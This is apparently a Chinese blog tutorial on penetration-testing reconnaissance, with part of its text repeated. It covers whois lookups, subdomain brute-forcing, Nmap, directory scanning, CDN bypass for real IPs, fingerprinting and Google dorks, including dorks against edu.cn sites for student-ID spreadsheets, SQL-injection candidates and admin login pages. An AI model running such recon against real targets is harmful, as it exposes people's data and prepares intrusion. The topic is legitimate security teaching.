href=\"https://www.baidu.com/link?url=3FgwnT9QFN6vq3kWs5j6pwOABJaCIh7TsI3BTK9ztZi&ck=1572.23.10095.0.0.263.313.0&shh=www.baidu.com&sht=baiduhome_pg&wd=&eqid=c03388eb000019b6000000065fa21e1e\">duer.baidu.com/</a>等。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318013238-cd05bb41-5943-41a7-9763-2d548e52b163.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=885&originWidth=1573&status=done&style=none&width=415\"></p>\n<h6 id=\"2-layer子域名挖掘机\"><a href=\"#2-layer子域名挖掘机\" class=\"headerlink\" title=\"2.layer子域名挖掘机\"></a>2.layer子域名挖掘机</h6><p>轻量级的子域名挖掘神器，它的原理是通过对于子域名进行爆破，获取相应的子域名再呈现出来，具体用法很简单，填写主域名、设置端口、选择dns解析的服务器，最后点击启动即可，如图所示，我爆破获取百度的子域名。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318013785-a9990f28-ea8a-4597-ac48-1dfa7eb6deab.png#align=left&display=inline&height=226&margin=%5Bobject%20Object%5D&originHeight=815&originWidth=1498&status=done&style=none&width=415\"></p>\n<h6 id=\"3-在线网站\"><a href=\"#3-在线网站\" class=\"headerlink\" title=\"3.在线网站\"></a>3.在线网站</h6><p>站长工具<br><a href=\"http://tool.chinaz.com/subdomain/\">http://tool.chinaz.com/subdomain/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014014-94735611-5da3-4581-986f-0e6fd6cc428d.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=819&originWidth=1456&status=done&style=none&width=415\"></p>\n<p>微步社区<br><a href=\"https://x.threatbook.cn/\">https://x.threatbook.cn/</a><br>微步社区最大的作用是用来查询威胁情报的，查询子域名我并不是很喜欢，比较少用。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014278-4f959e7d-4af0-43c6-91d3-d5bf92e81adf.png#align=left&display=inline&height=169&margin=%5Bobject%20Object%5D&originHeight=674&originWidth=1653&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014509-9d1e0079-2f8c-4a3a-9909-b37ee5990d6a.png#align=left&display=inline&height=118&margin=%5Bobject%20Object%5D&originHeight=459&originWidth=1615&status=done&style=none&width=415\"><br>在线二级域名子域名查询<br><a href=\"http://tools.bugscaner.com/subdomain/\">http://tools.bugscaner.com/subdomain/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014754-47fa1d03-4d3c-488e-9bc5-823769f28d5a.png#align=left&display=inline&height=196&margin=%5Bobject%20Object%5D&originHeight=727&originWidth=1541&status=done&style=none&width=416\"></p>\n<h6 id=\"4-Burp的Spider模块\"><a href=\"#4-Burp的Spider模块\" class=\"headerlink\" title=\"4.Burp的Spider模块\"></a>4.Burp的Spider模块</h6><p>首先要先捕获到主域名的数据包<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015002-6bb5d9cf-783c-446c-85fd-60e2c8f4bcf3.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415\"><br>右键send to Spider<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015253-75033e01-6639-4e33-9f04-a47e86e51c3f.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015499-4bd67a81-244c-425a-929f-dd1bc5b6e968.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415\"><br>在target模块便可以看到很多百度的子域名，而且burp的好处是不仅仅查询子域名，还能够查询到站点地图，这在很大程度上帮助我们了解了网站的具体框架结构，为后续的渗透测试奠定基础。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015717-513eea50-902a-4bdc-b1c0-0c3b1d3cebf8.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415\"><br>总而言之，收集子域名的方法还有很多，我比较喜欢用的就是layer子域名挖掘机和burp，当然还有很多在线工具可以通过百度子域名获取到。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016022-e11516a3-b4f0-428c-8198-ca2c8cc7a76a.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&originHeight=839&originWidth=1381&status=done&style=none&width=416\"></p>\n<h1 id=\"3-端口扫描\"><a href=\"#3-端口扫描\" class=\"headerlink\" title=\"3.端口扫描\"></a>3.端口扫描</h1><h6 id=\"Nmap\"><a href=\"#Nmap\" class=\"headerlink\" title=\"Nmap\"></a>Nmap</h6><p>说到端口扫描就马上可以想到kali Linux这个网络安全人员所熟知的系统。在kali系统里面集成了很多渗透测试的工具，其中有一款叫<strong>Nmap</strong>的工具，可以通过相应语法对目标主机进行端口扫描，得到目标主机的端口开放情况信息。有些危险端口开放了我们就可以尝试入侵，例如445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/jpeg/12366538/1612318016319-d7d1ce62-3b0c-4b38-8c8f-68a533fcbdcf.jpeg#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&originHeight=831&originWidth=1080&status=done&style=none&width=416\"><br>基础命令<br>-p  指定端口扫描<br>-v    显示扫描过程<br>-Pn 跳过主机发现过程直接端口扫描 [目标禁ping时使用]<br>-O   探测主机操作系统<br>-A   全面扫描，包括一切探测，由于动静太大而且时间问题不怎么使用</p>\n<p>端口扫描状态<br>Opend 端口开放<br>Closed 端口关闭<br>Filtered 端口被过滤</p>\n<h6 id=\"在线网站\"><a href=\"#在线网站\" class=\"headerlink\" title=\"在线网站\"></a>在线网站</h6><p>站长之家(因为要防止恶意攻击，所以只能单个端口测试)<br><a href=\"https://tool.chinaz.com/port/\">https://tool.chinaz.com/port/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016520-ce55aeb8-c365-44d1-b2cf-b2ea74ae5b3f.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=466&originWidth=1518&status=done&style=none&width=416\"><br>PostJson在线端口检测<br><a href=\"http://coolaf.com/tool/port\">http://coolaf.com/tool/port</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016801-603296e2-91f9-4e25-a719-994febd4fb4d.png#align=left&display=inline&height=191&margin=%5Bobject%20Object%5D&originHeight=786&originWidth=1704&status=done&style=none&width=415\"></p>\n<h1 id=\"4-目录扫描\"><a href=\"#4-目录扫描\" class=\"headerlink\" title=\"4.目录扫描\"></a>4.目录扫描</h1><p>目录是什么，目录就是一个网站的骨架，正如我们平时访问一个网站，先是进入了主目录，或者说访问了index.php/index.html等index文件，但是我们不知道目标网站还有哪些目录文件是我们可以访问的，所以就需要进行目录扫描了。下面介绍如何进行目录扫描。</p>\n<h6 id=\"御剑目录扫描工具\"><a href=\"#御剑目录扫描工具\" class=\"headerlink\" title=\"御剑目录扫描工具\"></a>御剑目录扫描工具</h6><p>御剑是一款能够通过字典对目标域名进行轮询访问，检测http状态码的软件，如果得到200回应就记录下来，也就得到了我们需要的目录信息。<br>这里随便扫了一个靶场，可以看到网站目录除了index.php之外还有一个robosts文件。robots.txt是一个基本上在每个网站中都会放置的文件，里面会标明了哪些目录可以爬取，哪些不可以爬取，当然这往往只是君子协议，真的爬取了也是无法拦截的。渗透测试过程中往往可以通过访问robots文件查看一些敏感目录。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017024-3f6d7017-9bb4-4ed6-b7b5-cfa57d7784b6.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&originHeight=422&originWidth=929&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017250-f2829b8b-9724-4f35-8b6f-34435020bdfa.png#align=left&display=inline&height=112&margin=%5Bobject%20Object%5D&originHeight=191&originWidth=706&status=done&style=none&width=415\"></p>\n<h1 id=\"5-C段\"><a href=\"#5-C段\" class=\"headerlink\" title=\"5.C段\"></a>5.C段</h1><p>C段，即IP地址的C段地址，如192.168.1.0/24。在渗透测试过程中，一个公司可能由于业务原因，会购买多个公网IP，那么为了方便，这些IP往往是相连的，甚至该公司会直接将那个公网IP的一个C段买下来。也就是说，测试站点所处的IP地址的C段，很可能也是该公司的资产，在渗透测试过程中可以通过迂回战术，先拿下C段的该公司的其他站点，再来对主站点进行渗透测试。<br>       要获取C段就涉及了一个内容——CDN，内容分发网络，是为了负载均衡，内容分发等而创建的一个智能虚拟网络。对于一些大公司来说，他的业务可能会有非常多以至于全世界都有人访问，那么一台服务器是不足以完成那么大的工作量的，这时候就需要购买CDN了，对于不同区域的用户分发不同的IP地址，里面存储了需要访问的资源，能够很大程度上减轻服务器的压力。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017568-5c04002e-c8b5-4e82-ba3d-7abd035154a3.png#align=left&display=inline&height=161&margin=%5Bobject%20Object%5D&originHeight=640&originWidth=1653&status=done&style=none&width=415\"><br>       有了CDN的存在也就是说，我们通过ping域名的方式获取的IP地址不一定是真实IP地址，所以我们就需要绕过CDN来获取真实IP地址进而获取C段。 下面介绍如何判断是否有CDN以及如何获取真实IP。</p>\n<h2 id=\"判断是否有CDN\"><a href=\"#判断是否有CDN\" class=\"headerlink\" title=\"判断是否有CDN\"></a>判断是否有CDN</h2><p>有一个在线工具叫多地点Ping，可以通过不同地点ping域名的对应IP是否相同来判断有没有CDN服务。<br><a href=\"https://www.ping.cn/ping/\">https://www.ping.cn/ping/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018031-574a3b07-13e2-43a7-ab42-68fc29bfe3b9.png#align=left&display=inline&height=201&margin=%5Bobject%20Object%5D&originHeight=827&originWidth=1710&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018340-373bc336-a54f-4277-b598-d393df18b9f5.png#align=left&display=inline&height=204&margin=%5Bobject%20Object%5D&originHeight=808&originWidth=1756&status=done&style=none&width=444\"><br>这里我测试的是baidu.com，很明显不同地区的IP不同，所以存在CDN。</p>\n<h2 id=\"绕过CDN获取真实IP\"><a href=\"#绕过CDN获取真实IP\" class=\"headerlink\" title=\"绕过CDN获取真实IP\"></a>绕过CDN获取真实IP</h2><p>1、 子域名查询<br>子域名与主域名同一服务器<br>CDN挂在主域名上，但是不一定挂在子域名上</p>\n<p>2、邮件服务器<br>从邮件服务器请求邮件，邮件中可以获取真实IP</p>\n<p>3、国外地址请求（国外ping）<br>4、遗留文件，扫描全网<br>例如通过phpinfo.php文件中获取IP地址<br>全网ping，从CDN中筛选真实IP</p>\n<p>5、fofa、shodan、zoomeye搜索特定文件/信息<br>6、dns历史记录<br>查询未使用cdn之前留下的真实IP记录</p>\n<h1 id=\"6-旁站\"><a href=\"#6-旁站\" class=\"headerlink\" title=\"6.旁站\"></a>6.旁站</h1><p>旁站，即同IP不同站点。旁站一般都是和目标站点在同一个内网或者是同一台服务器。在渗透测试过程中为了加大攻击面，往往还会获取目标的旁站，从旁站入手进行渗透测试。下面介绍如何获取旁站，一般都是通过在线工具获取。</p>\n<h6 id=\"站长工具\"><a href=\"#站长工具\" class=\"headerlink\" title=\"站长工具\"></a>站长工具</h6><p><a href=\"http://stool.chinaz.com/same\">http://stool.chinaz.com/same</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018532-9a0319b4-0f54-48e3-adc2-2d29d669163a.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&originHeight=881&originWidth=1525&status=done&style=none&width=415\"></p>\n<h6 id=\"The-Web-of-WebScan\"><a href=\"#The-Web-of-WebScan\" class=\"headerlink\" title=\"The Web of WebScan\"></a>The Web of WebScan</h6><p>       <a href=\"https://www.webscan.cc/\">https://www.webscan.cc/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018886-df5563b1-1301-4226-b344-36b4f314564e.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&originHeight=851&originWidth=1630&status=done&style=none&width=416\"></p>\n<h1 id=\"7-指纹识别\"><a href=\"#7-指纹识别\" class=\"headerlink\" title=\"7.指纹识别\"></a>7.指纹识别</h1><p>       指纹识别，也就是通过指纹信息判断当前系统的环境配置、使用的CMS等。说到指纹我们都不陌生了，手机就有指纹解锁。我们可以通过指纹信息判断一个人的身份，是否为当前手机的机主。渗透测试中的指纹识别也差不多，通过识别目标网站是否使用CMS模板搭建，使用了什么框架等，可以让我们能够针对性的对其进行渗透。<br>       CMS，内容管理系统。即一套web系统的模板，我们可以通过CMS快速搭建一个网站，这种模板的代码一般开源，在网上也有很多旧版本的漏洞。通过识别是什么CMS，我们就可以搜索该CMS的历史漏洞，即Nday，测试是否有修复。<br>       指纹识别一般通过下面几种在线工具进行识别。</p>\n<h6 id=\"Whatweb在线指纹识别\"><a href=\"#Whatweb在线指纹识别\" class=\"headerlink\" title=\"Whatweb在线指纹识别\"></a>Whatweb在线指纹识别</h6><p><a href=\"http://whatweb.bugscaner.com/\">http://whatweb.bugscaner.com/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019120-8c399c9b-1803-4b93-b5a9-6d1a8e2797bf.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&originHeight=730&originWidth=1434&status=done&style=none&width=416\"><br>如图我们成功判断出该站点的cms为dedecms，那么就可以通过dedecms的历史漏洞进行渗透测试。</p>\n<h6 id=\"微步社区（tips-只输入域名即可，不需要加上http-）\"><a href=\"#微步社区（tips-只输入域名即可，不需要加上http-）\" class=\"headerlink\" title=\"微步社区（tips:只输入域名即可，不需要加上http://）\"></a>微步社区（tips:只输入域名即可，不需要加上http://）</h6><p><a href=\"https://x.threatbook.cn/\">https://x.threatbook.cn/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019391-b0d067bd-76ae-4851-94ce-3f628b4040e7.png#align=left&display=inline&height=187&margin=%5Bobject%20Object%5D&originHeight=797&originWidth=1767&status=done&style=none&width=415\"><br>微步社区不怎么用，还是以查询威胁情报为主的，这里看到可以查询到域名解析、子域名、whois等信息。</p>\n<h6 id=\"云溪指纹（需要邀请码，需要注册，还挺麻烦的）\"><a href=\"#云溪指纹（需要邀请码，需要注册，还挺麻烦的）\" class=\"headerlink\" title=\"云溪指纹（需要邀请码，需要注册，还挺麻烦的）\"></a>云溪指纹（需要邀请码，需要注册，还挺麻烦的）</h6><p><a href=\"https://www.yunsee.cn/\">https://www.yunsee.cn/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019653-f806593e-20f9-44c0-8c03-8f8c288528e2.png#align=left&display=inline&height=200&margin=%5Bobject%20Object%5D&originHeight=813&originWidth=1687&status=done&style=none&width=415\"><br>可以看到云溪指纹查询的信息就很全面，然后还提供了查看漏洞功能，所以个人是很喜欢使用云溪指纹识别的。</p>\n<h1 id=\"8-内容敏感信息泄露-（google-hacking）\"><a href=\"#8-内容敏感信息泄露-（google-hacking）\" class=\"headerlink\" title=\"8. 内容敏感信息泄露 （google hacking）\"></a>8. 内容敏感信息泄露 （google hacking）</h1><h6 id=\"Google搜索引擎\"><a href=\"#Google搜索引擎\" class=\"headerlink\" title=\"Google搜索引擎\"></a>Google搜索引擎</h6><p>Google是一款十分强大的搜索引擎，黑客们常常借助它搜索网站的一些敏感目录和文件，甚至可以利用它的搜索功能来自动攻击那些有漏洞的网站；而有些人可以通过搜索把某个个人的信息，包括住址、电话号码、出生年月等都可以搜索出来；当然我们在日常的生活中正确的借助Google搜索也可以更加高效的找到我们需要的东西。也就是说我们通过谷歌搜索引擎，加上google语法，能够收集到一些敏感信息。</p>\n<h6 id=\"Google镜像站\"><a href=\"#Google镜像站\" class=\"headerlink\" title=\"Google镜像站\"></a>Google镜像站</h6><p>我们都知道，国内是无法访问google搜索引擎的，虽然其他搜索引擎也是可以使用google语法的，但是会过滤掉一些信息，用起来很不方便，所以还是推荐使用谷歌。<br>有一款工具叫<strong>谷歌镜像站</strong>，是国人搭建的类似google搜索引擎的网站，可以达到类似google的效果。谷歌镜像站可以通过百度获得。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019936-1bd50b23-7b3c-4a70-aa96-658e0335aca6.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&originHeight=715&originWidth=995&status=done&style=none&width=415\"></p>\n<h6 id=\"Google语法\"><a href=\"#Google语法\" class=\"headerlink\" title=\"Google语法\"></a>Google语法</h6><p>1.site<br>site:edu.cn //搜索该域名下的所有站点，包括子域名<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020203-b6a9c5f9-0501-4077-8730-96ea362b3292.png#align=left&display=inline&height=355&margin=%5Bobject%20Object%5D&originHeight=868&originWidth=1016&status=done&style=none&width=416\"><br>2.inurl<br>搜索域名中与关键字匹配的页面<br>常用的有<br>inurl:php?id= //查询域名中带有php?id=的页面<br>inurl:admin.php //查询域名中带有admin.php的页面，多用于查询后台<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020523-4b20c405-75d4-40d8-a820-4ec187a5ab43.png#align=left&display=inline&height=354&margin=%5Bobject%20Object%5D&originHeight=859&originWidth=1008&status=done&style=none&width=415\"><br>3.intitle<br>搜索网页中的标题内容与关键字匹配的页面<br>intitle:后台管理 //查询网页标题含有后台管理的页面<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020892-9b3a08b4-41fd-47b9-9754-1b31090ff1a1.png#align=left&display=inline&height=370&margin=%5Bobject%20Object%5D&originHeight=862&originWidth=966&status=done&style=none&width=415\"><br>4.intext<br>搜索网页内容与关键字匹配的页面<br>intext:dedecms //查询网页内容含有dedecms的页面<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021172-54b43fd9-0539-45f9-991c-a972cdf7a329.png#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&originHeight=877&originWidth=1004&status=done&style=none&width=416\"><br>5.filetype<br>搜索文件类型与关键字匹配的文件<br>filetype:xls //查询excel文件<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021378-a16c3394-66ad-4e74-a6e0-c35950d33e3c.png#align=left&display=inline&height=259&margin=%5Bobject%20Object%5D&originHeight=860&originWidth=1379&status=done&style=none&width=415\"></p>\n<h6 id=\"内容敏感信息泄露\"><a href=\"#内容敏感信息泄露\" class=\"headerlink\" title=\"内容敏感信息泄露\"></a>内容敏感信息泄露</h6><p>1、搜索高校存在学号字眼的excel文件，用来获取学号信息<br>语法：filetype:xls site:edu.cn 学号<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021636-76854a1d-d7e8-4ff2-b3bb-bdcc3c447153.png#align=left&display=inline&height=258&margin=%5Bobject%20Object%5D&originHeight=823&originWidth=1325&status=done&style=none&width=415\"><br>2、搜索高校域名中存在php?id=的页面，尝试测试是否存在SQL注入<br>语法：site:edu.cn inurl:php?id=<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021928-cbde4c02-b00f-47b6-b4fa-ca9ca587e9d0.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&originHeight=793&originWidth=1025&status=done&style=none&width=415\"><br>3、搜索高校的后台登录页面<br>语法：site:edu.cn intitle:后台登录</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318022137-beeab898-94ca-4ed8-b7fc-4f93370d57f5.png#align=left&display=inline&height=358&margin=%5Bobject%20Object%5D&originHeight=870&originWidth=1011&status=done&style=none&width=416\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"网络安全法\"><a href=\"#网络安全法\" class=\"headerlink\" title=\"网络安全法\"></a>网络安全法</h1><p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318010564-9fc29c4c-dae7-4181-b53f-e9b50e2c7079.png#align=left&display=inline&height=82&margin=%5Bobject%20Object%5D&originHeight=176&originWidth=895&status=done&style=none&width=415\"><br>上面是中国网络安全法第四十一条，因为与这篇推文相对应，所有拿出来用。信息收集的作用很强大，希望大家在学习的同时，注意把握度量！<br><strong>本篇推文仅涉及信息收集教学，如有任何不良情况，请第一时间联系我删除。</strong></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>归结而言，信息搜集，是渗透测试的灵魂。其实在日常生活中我们无时无刻不在进行信息收集。要参加一个比赛，我们会提前了解比赛内容，这就是信息收集；要追求一个女生，我们会通过接触她的闺蜜，了解她的喜好，获取她的微信号、QQ号等，这也是信息收集。在抗战时期，信息收集的重要性就体现出来了，一场战争的输赢，在很大程度上就依赖于信息收集的完整性。敌军的数量有多少、军队部署怎么样等，可以让我们提前针对并部署相应的方案来应对。这也是为什么当时情报部门非常重要的体现了。<br>那么接下来，我将详细介绍在渗透测试中如何进行信息收集。</p>\n<h1 id=\"1-whois信息\"><a href=\"#1-whois信息\" class=\"headerlink\" title=\"1.whois信息\"></a>1.whois信息</h1><p><img src=\"https://cdn.nlark.com/yuque/0/2021/jpeg/12366538/1612318010785-fb525994-7672-49f7-bbb7-ccb4d4c5773e.jpeg#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=599&originWidth=1004&status=done&style=none&width=416\"><br>什么是whois？whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库。在渗透测试中，whois可以很好地收集到目标域名的相应信息，例如注册人的邮箱，姓名，手机号等。进行whois信息收集一般是通过在线工具：</p>\n<h6 id=\"站长之家\"><a href=\"#站长之家\" class=\"headerlink\" title=\"站长之家\"></a>站长之家</h6><p><a href=\"http://whois.chinaz.com/\">http://whois.chinaz.com/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011036-2643d590-cab6-4fb7-97b0-390357bfd661.png#align=left&display=inline&height=170&margin=%5Bobject%20Object%5D&originHeight=622&originWidth=1514&status=done&style=none&width=415\"></p>\n<h6 id=\"中国万网\"><a href=\"#中国万网\" class=\"headerlink\" title=\"中国万网\"></a>中国万网</h6><p>    <a href=\"https://whois.aliyun.com/\">https://whois.aliyun.com/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011319-c2188cc2-200d-41cd-b815-b92cfdf44f95.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&originHeight=757&originWidth=1639&status=done&style=none&width=415\"></p>\n<h6 id=\"Whois-com\"><a href=\"#Whois-com\" class=\"headerlink\" title=\"Whois.com\"></a>Whois.com</h6><p>    <a href=\"https://www.whois.com/\">https://www.whois.com/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011570-840227d8-d2c1-4801-bb2a-5d20217c7755.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&originHeight=818&originWidth=1649&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011880-2eb94c58-36a0-4ef8-81d5-a38cda973365.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=876&originWidth=1560&status=done&style=none&width=415\"><br>个人还是比较喜欢whois.com的，因为站长之家等网站会对一些信息进行隐藏，所以我比较多用其他的。Whois查询网站还有很多很多，可以通过百度whois来获取。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012193-94c82cb1-a2a2-4525-bdfd-87651d245f70.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&originHeight=870&originWidth=1649&status=done&style=none&width=416\"></p>\n<p>这里还是以站长之家whois 查询sougou.com来举例：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012469-52918a1e-d2c4-4e00-86a9-375f4b9db14d.png#align=left&display=inline&height=259&margin=%5Bobject%20Object%5D&originHeight=688&originWidth=1101&status=done&style=none&width=415\"><br>可以看到，这里我查询的域名是sougou.com，通过whois，我可以知道注册商，注册人的邮箱，联系电话等信息。在这些信息后面有个whois反查，这个也很重要，whois反查可以查询该联系人或者该邮箱还注册了什么网站。如图为whois反查联系电话的结果，可以看到下面都是该联系电话注册的网站。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012718-b5043e7e-b219-42ed-b588-a1147c8c1569.png#align=left&display=inline&height=214&margin=%5Bobject%20Object%5D&originHeight=796&originWidth=1545&status=done&style=none&width=416\"></p>\n<h1 id=\"2-子域名查询\"><a href=\"#2-子域名查询\" class=\"headerlink\" title=\"2.子域名查询\"></a>2.子域名查询</h1><p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012941-9bb94596-8575-4708-8afd-354f032e0c3f.png#align=left&display=inline&height=93&margin=%5Bobject%20Object%5D&originHeight=124&originWidth=252&status=done&style=none&width=189\"><br>首先介绍一下什么是域名。<br>这里我以微信公众平台的域名举例。如图可以看到，这里的URL的前面的部分是mp.weixin.qq.com。这就是域名。在这里我们可以进行拆分为以下几个域名：<br>1.    mp.weixin.qq.com<br>2.    weixin.qq.com<br>3.    qq.com</p>\n<p>最短的那个qq.com便是根域名，也叫一级域名，这种域名所在的网站相对安全，很难对其进行渗透测试。但是根域名可以衍生出很多很多子域名，他们有直接或者间接的联系。也就是说，如果你对一个子域名进行了渗透测试，很可能会间接对根域名所在服务器进行影响，所以我们可以对子域名进行信息查询，进而可以扩大攻击范围，子域名一定是有关联的，很多时候基本上都同属一个公司。<br>查询子域名有以下几种方法：<br>1、通过google语法的site<br>2、通过layer子域名挖掘机<br>3、通过在线网站<br>4、通过burp的爬虫模块</p>\n<h6 id=\"1-google语法的site语法：\"><a href=\"#1-google语法的site语法：\" class=\"headerlink\" title=\"1.google语法的site语法：\"></a>1.google语法的site语法：</h6><p>搜索引擎非常强大，site语法的做用是查询site后面的域名下的所有站点，包括子域名；如图所示，我查询了baidu.com，下面出现的全部都是baidu.com域名下的网站，如<a href=\"http://www.baidu.com/link?url=QbP0CFzbjqE-QGJYkDXlWiAZpdBm9d976Ij32TA6LUe&ck=5250.6.1604460120086.0.0.263.313.0&shh=www.baidu.com&sht=baiduhome_pg\">site.baidu.com</a>、baike.baidu.com、<a href=\"https://www.baidu.com/link?url=3FgwnT9QFN6vq3kWs5j6pwOABJaCIh7TsI3BTK9ztZi&ck=1572.23.10095.0.0.263.313.0&shh=www.baidu.com&sht=baiduhome_pg&wd=&eqid=c03388eb000019b6000000065fa21e1e\">duer.baidu.com/</a>等。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318013238-cd05bb41-5943-41a7-9763-2d548e52b163.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=885&originWidth=1573&status=done&style=none&width=415\"></p>\n<h6 id=\"2-layer子域名挖掘机\"><a href=\"#2-layer子域名挖掘机\" class=\"headerlink\" title=\"2.layer子域名挖掘机\"></a>2.layer子域名挖掘机</h6><p>轻量级的子域名挖掘神器，它的原理是通过对于子域名进行爆破，获取相应的子域名再呈现出来，具体用法很简单，填写主域名、设置端口、选择dns解析的服务器，最后点击启动即可，如图所示，我爆破获取百度的子域名。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318013785-a9990f28-ea8a-4597-ac48-1dfa7eb6deab.png#align=left&display=inline&height=226&margin=%5Bobject%20Object%5D&originHeight=815&originWidth=1498&status=done&style=none&width=415\"></p>\n<h6 id=\"3-在线网站\"><a href=\"#3-在线网站\" class=\"headerlink\" title=\"3.在线网站\"></a>3.在线网站</h6><p>站长工具<br><a href=\"http://tool.chinaz.com/subdomain/\">http://tool.chinaz.com/subdomain/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014014-94735611-5da3-4581-986f-0e6fd6cc428d.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=819&originWidth=1456&status=done&style=none&width=415\"></p>\n<p>微步社区<br><a href=\"https://x.threatbook.cn/\">https://x.threatbook.cn/</a><br>微步社区最大的作用是用来查询威胁情报的，查询子域名我并不是很喜欢，比较少用。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014278-4f959e7d-4af0-43c6-91d3-d5bf92e81adf.png#align=left&display=inline&height=169&margin=%5Bobject%20Object%5D&originHeight=674&originWidth=1653&status=done&style=none&width=415\"><br><img 